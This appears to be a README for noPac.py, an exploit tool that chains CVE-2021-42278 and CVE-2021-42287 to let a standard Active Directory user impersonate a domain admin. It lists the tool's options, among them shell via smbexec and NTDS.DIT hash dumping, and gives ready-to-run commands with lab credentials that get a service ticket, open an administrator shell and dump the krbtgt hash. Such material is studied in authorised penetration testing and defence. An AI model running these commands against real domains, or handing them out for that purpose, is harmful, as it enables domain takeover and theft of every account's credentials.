
## About

Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 

Changed from [sam-the-admin](https://github.com/WazeHell/sam-the-admin).

## Usage
```
SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain

positional arguments:
  [domain/]username[:password]
                        Account used to authenticate to DC.

optional arguments:
  -h, --help            show this help message and exit
  --impersonate IMPERSONATE
                        target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
  -domain-netbios NETBIOSNAME
                        Domain NetBIOS name. Required if the DC has multiple domains.
  -new-name NEWNAME     Add new computer name, if not specified, will be random generated.
  -debug                Turn DEBUG output ON
  -ts                   Adds timestamp to every logging output
  -shell                Drop a shell via smbexec
  -dump                 Dump Hashs via secretsdump
  -use-ldaps            Use LDAPS instead of LDAP
  -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER needs root!)

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on account parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
  -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.specified in the account parameter will be used

execute options:
  -port [destination port]
                        Destination port to connect to SMB Server
  -share SHARE          share where the output will be grabbed from (default ADMIN$)
  -shell-type {cmd,powershell}
                        choose a command processor for the semi-interactive shell
  -codec CODEC          Sets encoding used (codec) from the target's output (default "GBK").
  -service-name service_name
                        The name of theservice used to trigger the payload

dump options:
  -just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch
  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data
  -user-status          Display whether or not the user is disabled
  -history              Dump password history, and LSA secrets OldVal
  -resumefile RESUMEFILE
                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session's state
  -use-vss              Use the VSS method insead of default DRSUAPI
  -exec-method [{smbexec,wmiexec,mmcexec}]
                        Remote exec method to use at target (only when using -use-vss). Default: smbexec
```

>Note: If -host-name is not specified, the tool will automatically get the domain control hostname, please select the hostname of the host specified by -dc-ip. If --impersonate is not specified, the tool will randomly choose a doamin admin to exploit.

### GetST
```
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112131712015.png)

### Auto get shell
```
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 -shell --impersonate administrator 
```

![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132025207.png)
### Dump hash
```
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132025423.png)


## Scanner
```
python scanner.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132151180.png)